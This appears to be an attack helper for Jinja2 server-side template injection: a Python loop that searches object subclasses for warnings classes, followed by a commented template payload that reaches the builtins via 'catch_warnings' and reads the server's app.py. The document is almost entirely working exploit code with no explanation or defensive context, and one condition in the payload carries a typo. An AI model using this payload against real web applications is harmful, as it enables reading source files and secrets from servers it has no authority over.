subclazz = ''.__class__.__bases__[0].__subclasses__()
for i in range(len(subclazz)):
    if 'warnings' in str(subclazz[i]):
        print(f'[+] INDEX: {i} - SUBCLAZZ: {str(subclazz[i])}')


#{% for x in ''.__class__.__bases__[0].__subclasses__() %}{% if x.__name == 'catch_warnings' or x.__name__ == 'WarningMessage'%}{{ x.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
